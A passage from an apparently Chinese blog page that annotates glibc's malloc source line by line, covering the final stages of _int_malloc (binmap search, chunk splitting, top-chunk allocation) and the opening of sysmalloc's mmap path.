class="hljs-keyword">else</span><br>                &#123;<br>                    remainder = chunk_at_offset (victim, nb);<br>                    <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                       have to perform a complete insert here.  */</span><br>                    <span class="hljs-comment">// 将切割后的 chunk 放入 unsorted bin 中</span><br>                    <span class="hljs-comment">// 记录 remainder</span><br>                    bck = unsorted_chunks (av);<br>                    fwd = bck-&gt;fd;<br>                    <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))<br>                        malloc_printerr(<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>);<br>                    remainder-&gt;bk = bck;<br>                    remainder-&gt;fd = fwd;<br>                    bck-&gt;fd = remainder;<br>                    fwd-&gt;bk = remainder;<br>                    <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size)) &#123;<br>                        remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                        remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                    &#125;<br>                    set_head (victim, nb | PREV_INUSE |<br>                                      (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                    set_head (remainder, remainder_size | PREV_INUSE);<br>                    set_foot (remainder, remainder_size);<br>                &#125;<br>                check_malloced_chunk (av, victim, nb);<br>                <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>                alloc_perturb(p, bytes);<br>                <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">           Search for a chunk by scanning bins, starting with next largest</span><br><span class="hljs-comment">           bin. This search is strictly by best-fit; i.e., the smallest</span><br><span class="hljs-comment">           (with ties going to approximately the least recently used) chunk</span><br><span class="hljs-comment">           that fits is selected.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">           The bitmap avoids needing to check that most blocks are nonempty.</span><br><span class="hljs-comment">           The particular case of skipping all bins during warm-up phases</span><br><span class="hljs-comment">           when no chunks have been returned yet is faster than it might look.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">// 如果通过上面的方式从最合适的 small bin 或 large bin 中都没有分配到需要的 chunk，</span><br>        <span class="hljs-comment">// 则 查看比当前 bin 的 index 大的 small bin 或 large bin 是否有空闲 chunk 可利用来分配所需的 chunk。</span><br>        <span class="hljs-comment">// 获取下一个相邻 bin 的空闲 chunk 链表</span><br>        ++idx;<br>        bin = bin_at (av, idx);<br>        <span class="hljs-comment">// binmap 字段是一个 int 数组，ptmalloc 用一个 bit 来标识该 bit 对应的 bin 中是否包含空闲 chunk。</span><br>        <span class="hljs-comment">// Binmap 按 block 管理，每个 block 为一个 int，共 32 个 bit，可以表示 32 个 bin 中是否有空闲 chunk 存在。</span><br>        <span class="hljs-comment">// 使用 binmap 可以加快查找 bin 是否包含空闲 chunk。</span><br>        <span class="hljs-comment">// 这里只查询比所需 chunk 大的 bin 中是否有空闲 chunk 可用。</span><br>        block = idx2block (idx);<br>        <span class="hljs-built_in">map</span> = av-&gt;binmap[block];<br>        <span class="hljs-comment">// Idx2bit()宏将 idx 指定的位设置为 1，其它位清零，</span><br>        <span class="hljs-comment">// map 表示一个 block(unsigned int) 值，如果bit 大于 map，</span><br>        <span class="hljs-comment">// 意味着比bit对应的bin的size大的bin中无空闲chunk，</span><br>        <span class="hljs-comment">// 如果 map 为 0，该 block 所对应的所有 bins 中都没有空闲 chunk，</span><br>        <span class="hljs-comment">// 于是遍历 binmap 的下一个 block，直到找到一个不为 0 的 block</span><br>        <span class="hljs-comment">// 或者遍历完所有的 block。</span><br>        <span class="hljs-comment">// 退出循环遍历后，设置 bin 指向 block 的第一个 bit 对应的 bin，</span><br>        <span class="hljs-comment">// 并将 bit 置为 1，表示该 block 中 bit 1 对应的 bin，</span><br>        <span class="hljs-comment">// 这个 bin 中如果有空闲 chunk，该 chunk 的大小一定满足要求。</span><br>        bit = idx2bit (idx);<br><br>        <span class="hljs-keyword">for</span> (;;) &#123;<br>            <span class="hljs-comment">//     如果bit 大于 map，意味着比该bit对应的bin的size大的bin中无空闲chunk，如果 map 为 0，</span><br>            <span class="hljs-comment">//      该 block 所对应的所有 bins 中都没有空闲 chunk 。接着在下一个block中寻找</span><br>            <span class="hljs-comment">/* Skip rest of block if there are no more set bits in this block.  */</span><br>            <span class="hljs-keyword">if</span> (bit &gt; <span class="hljs-built_in">map</span> || bit == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">do</span> &#123;<br>                    <span class="hljs-keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="hljs-comment">/* out of bins */</span><br>                        <span class="hljs-comment">// 如果block超过了范围，说明比所需chunk大的bin中没有chunk，直接使用top_chunk</span><br>                        <span class="hljs-keyword">goto</span> use_top;<br>                <span class="hljs-comment">// 如果block为0,这表明block中的所有bit所对应的bin没有空闲chunk</span><br>                &#125; <span class="hljs-keyword">while</span> ((<span class="hljs-built_in">map</span> = av-&gt;binmap[block]) == <span class="hljs-number">0</span>);<br><br>                bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));<br>                bit = <span class="hljs-number">1</span>;<br>            &#125;<br><br>            <span class="hljs-comment">/* Advance to bin with set bit. There must be one. */</span><br>            <span class="hljs-comment">// 在一个block遍历对应的 bin，直到找到一个 bit 不为 0 退出遍历，则该 bit 对于的 bin 中有空闲 chunk 存在。</span><br>            <span class="hljs-keyword">while</span> ((bit &amp; <span class="hljs-built_in">map</span>) == <span class="hljs-number">0</span>) &#123;<br>                bin = next_bin (bin);<br>                bit &lt;&lt;= <span class="hljs-number">1</span>;<br>                assert(bit != <span class="hljs-number">0</span>);<br>            &#125;<br><br>            <span class="hljs-comment">/* Inspect the bin. It is likely to be non-empty */</span><br>            <span class="hljs-comment">// 获取bin尾部的chunk</span><br>            victim = last (bin);<br><br>            <span class="hljs-comment">/*  If a false alarm (empty bin), clear the bit. */</span><br>            <span class="hljs-comment">//         如果 victim 与 bin 链表头指针相同，表示该 bin 中没有空闲 chunk，binmap 中的相应位</span><br>            <span class="hljs-comment">//        设置不准确，将 binmap 的相应 bit 位清零，获取当前 bin 下一个 bin，将 bit 移到下一个</span><br>            <span class="hljs-comment">//        bit 位，即乘以 2。</span><br>            <span class="hljs-keyword">if</span> (victim == bin) &#123;<br>                av-&gt;binmap[block] = <span class="hljs-built_in">map</span> &amp;= ~bit; <span class="hljs-comment">/* Write through */</span><br>                bin = next_bin (bin);<br>                bit &lt;&lt;= <span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// 当前 bin 中的最后一个 chunk 满足要求，获取该 chunk 的大小，计算切分出所需 chunk</span><br>                <span class="hljs-comment">// 后剩余部分的大小，然后将 victim 从 bin 的链表中取出。</span><br>                <span class="hljs-comment">/*  We know the first chunk in this bin is big enough to use. */</span><br>                size = chunksize (victim);<br>                assert((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb));<br><br>                remainder_size = size - nb;<br><br>                <span class="hljs-comment">/* unlink */</span><br>                unlink (av, victim, bck, fwd);<br><br>                <span class="hljs-comment">/* Exhaust */</span><br>                <span class="hljs-comment">//         如果剩余部分的大小小于 MINSIZE，将整个 chunk 分配给应用层，设置 victim 的状态为</span><br>                <span class="hljs-comment">//        inuse，如果当前分配区为非主分配区，设置 victim 的非主分配区标志位。</span><br>                <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>                &#123;<br>                    set_inuse_bit_at_offset (victim, size);<br>                    <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                        set_non_main_arena (victim);<br>                &#125;<br><br>                <span class="hljs-comment">/* Split */</span><br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-comment">// 如果剩余的大小可以作为一个chunk</span><br>                    <span class="hljs-comment">// 获得剩余部分的地址，放入unsorted bin中</span><br>                    remainder = chunk_at_offset (victim, nb);<br><br>                    <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                       have to perform a complete insert here.  */</span><br>                    bck = unsorted_chunks (av);<br>                    fwd = bck-&gt;fd;<br>                    <span class="hljs-comment">// 检查unsorted bin 中的链表头部是否合法</span><br>                    <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))<br>                        malloc_printerr(<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>);<br>                    remainder-&gt;bk = bck;<br>                    remainder-&gt;fd = fwd;<br>                    bck-&gt;fd = remainder;<br>                    fwd-&gt;bk = remainder;<br><br>                    <span class="hljs-comment">/* advertise as last remainder */</span><br>                    <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>                        av-&gt;last_remainder = remainder;<br>                    <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size)) &#123;<br>                        remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                        remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                    &#125;<br>                    set_head (victim, nb | PREV_INUSE |<br>                                      (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                    set_head (remainder, remainder_size | PREV_INUSE);<br>                    set_foot (remainder, remainder_size);<br>                &#125;<br>                check_malloced_chunk (av, victim, nb);<br>                <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>                alloc_perturb(p, bytes);<br>                <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br><br>        use_top:<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">           If large enough, split off the chunk bordering the end of memory</span><br><span class="hljs-comment">           (held in av-&gt;top). Note that this is in accord with the best-fit</span><br><span class="hljs-comment">           search rule.  In effect, av-&gt;top is treated as larger (and thus</span><br><span class="hljs-comment">           less well fitting) than any other available chunk since it can</span><br><span class="hljs-comment">           be extended to be as large as necessary (up to system</span><br><span class="hljs-comment">           limitations).</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">           We require that av-&gt;top always exists (i.e., has size &gt;=</span><br><span class="hljs-comment">           MINSIZE) after initialization, so if it would otherwise be</span><br><span class="hljs-comment">           exhausted by current request, it is replenished. (The main</span><br><span class="hljs-comment">           reason for ensuring it exists is that we may need MINSIZE space</span><br><span class="hljs-comment">           to put in fenceposts in sysmalloc.)</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">// 如果从所有的 bins 中都没有获得所需的 chunk，可能的情况为 bins 中没有空闲 chunk，</span><br>        <span class="hljs-comment">// 或者所需的 chunk 大小很大，下一步将尝试从 top chunk 中分配所需 chunk。</span><br>        victim = av-&gt;top;<br>        size = chunksize (victim);<br><br>        <span class="hljs-comment">// 果 top chunk 满足我们要申请的 chunk 大小要求</span><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>        &#123;<br>            <span class="hljs-comment">// 切割 top chunk</span><br>            remainder_size = size - nb;<br>            remainder = chunk_at_offset (victim, nb);<br>            av-&gt;top = remainder;<br>            set_head (victim, nb | PREV_INUSE |<br>                              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>            set_head (remainder, remainder_size | PREV_INUSE);<br><br>            check_malloced_chunk (av, victim, nb);<br>            <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>            alloc_perturb(p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br><br>        <span class="hljs-comment">/* When we are using atomic ops to free fast chunks we can get</span><br><span class="hljs-comment">           here for all block sizes.  */</span><br>        <span class="hljs-comment">// 如果 top chunk 空间不够</span><br>        <span class="hljs-comment">// 且 fastbin 中有空闲 chunk</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (atomic_load_relaxed(&amp;av-&gt;have_fastchunks)) &#123;<br>            <span class="hljs-comment">// 触发 malloc_consolidate 函数合并 fastbin 的 chunk</span><br>            malloc_consolidate(av);<br>            <span class="hljs-comment">/* restore original bin index */</span><br>            <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>                idx = smallbin_index (nb);<br>            <span class="hljs-keyword">else</span><br>                idx = largebin_index (nb);<br>        &#125;<br><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">               Otherwise, relay to handle system-dependent cases</span><br><span class="hljs-comment">             */</span><br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">void</span> *p = sysmalloc(nb, av);<br>            <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>                alloc_perturb(p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc"></a>sysmalloc</h3><blockquote><p>此部分来自 <a href="https://www.cnblogs.com/luoleqi/p/15520621.html#malloc_consolidatemstate-av">link</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   sysmalloc handles malloc cases requiring more memory from the system.</span><br><span class="hljs-comment">   On entry, it is assumed that av-&gt;top does not have enough</span><br><span class="hljs-comment">   space to service request for nb bytes, thus requiring that av-&gt;top</span><br><span class="hljs-comment">   be extended or replaced.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">sysmalloc</span><span class="hljs-params">(INTERNAL_SIZE_T nb, mstate av)</span> &#123;<br>    mchunkptr old_top;              <span class="hljs-comment">/* incoming value of av-&gt;top */</span><br>    INTERNAL_SIZE_T old_size;       <span class="hljs-comment">/* its size */</span><br>    <span class="hljs-type">char</span> *old_end;                  <span class="hljs-comment">/* its end address */</span><br><br>    <span class="hljs-type">long</span> size;                      <span class="hljs-comment">/* arg to first MORECORE or mmap call */</span><br>    <span class="hljs-type">char</span> *brk;                      <span class="hljs-comment">/* return value from MORECORE */</span><br><br>    <span class="hljs-type">long</span> correction;                <span class="hljs-comment">/* arg to 2nd MORECORE call */</span><br>    <span class="hljs-type">char</span> *snd_brk;                  <span class="hljs-comment">/* 2nd return val */</span><br><br>    INTERNAL_SIZE_T front_misalign; <span class="hljs-comment">/* unusable bytes at front of new space */</span><br>    INTERNAL_SIZE_T end_misalign;   <span class="hljs-comment">/* partial page left at end of new space */</span><br>    <span class="hljs-type">char</span> *aligned_brk;              <span class="hljs-comment">/* aligned offset into brk */</span><br><br>    mchunkptr p;                    <span class="hljs-comment">/* the allocated/returned chunk */</span><br>    mchunkptr remainder;            <span class="hljs-comment">/* remainder from allocation */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size;   <span class="hljs-comment">/* its size */</span><br><br><br>    <span class="hljs-type">size_t</span> pagesize = GLRO(dl_pagesize);<br>    <span class="hljs-type">bool</span> tried_mmap = <span class="hljs-literal">false</span>;<br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">       If have mmap, and the request size meets the mmap threshold, and</span><br><span class="hljs-comment">       the system supports mmap, and there are few enough currently</span><br><span class="hljs-comment">       allocated mmapped regions, try to directly map this request</span><br><span class="hljs-comment">       rather than expanding top.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">// 如果没有分配区</span><br>    <span class="hljs-comment">// 或所需分配的 chunk 大小大于 mmap 分配阈值 且 当前进程使用 mmap() 分配的内存块小于设定的最大值</span><br>    <span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span><br>        || ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (mp_.mmap_threshold)<br>            &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) &#123;<br>        <span class="hljs-type">char</span> *mm;           <span class="hljs-comment">/* return value from mmap call*/</span><br><br>        try_mmap:<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">           Round up size to nearest page.  For mmapped chunks, the overhead</span><br><span class="hljs-comment">           is one SIZE_SZ unit larger than for normal chunks, because there</span><br><span class="hljs-comment">           is no following chunk whose prev_size field could be used.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">           See the front_misalign handling below, for glibc there is no</span><br><span class="hljs-comment">           need for further alignments unless we have have high alignment.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">// 计算满足页对齐的最小分配内存大小</span><br>        <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ)<br>            size = ALIGN_UP(nb + SIZE_SZ, pagesize);<br>        <span class="hljs-keyword">else</span><br>            size = ALIGN_UP(nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);<br>        tried_mmap = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-comment">/* Don&#x27;t try if size wraps around 0 */</span><br>        <span class="hljs-comment">// 如果重新计算所需分配的 size 大于 nb</span><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb)) &#123;<br>            mm = (<span class="hljs-type">char</span> *) (MMAP (<span class="hljs-number">0</span>, size, PROT_READ | PROT_WRITE, <span class="hljs-number">0</span>));<br>            <span class="hljs-comment">// 如果 mmap()分配内存成功</span><br>            <span class="hljs-comment">// 将 mmap()返回的内存指针强制转换为 chunk 指针</span><br>            <span class="hljs-comment">// 并设置该 chunk 的大小为 size，同时设置该 chunk 的 IS_MMAPPED 标志位</span><br>            <span class="hljs-comment">// 表示本 chunk 是通过 mmap()函数直接从系统分配的</span><br>            <span class="hljs-keyword">if</span> (mm != MAP_FAILED) &#123;<br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                   The offset to the start of the mmapped region is stored</span><br><span class="hljs-comment">                   in the prev_size field of the chunk. This allows us to adjust</span><br><span class="hljs-comment">                   returned start address to meet alignment requirements 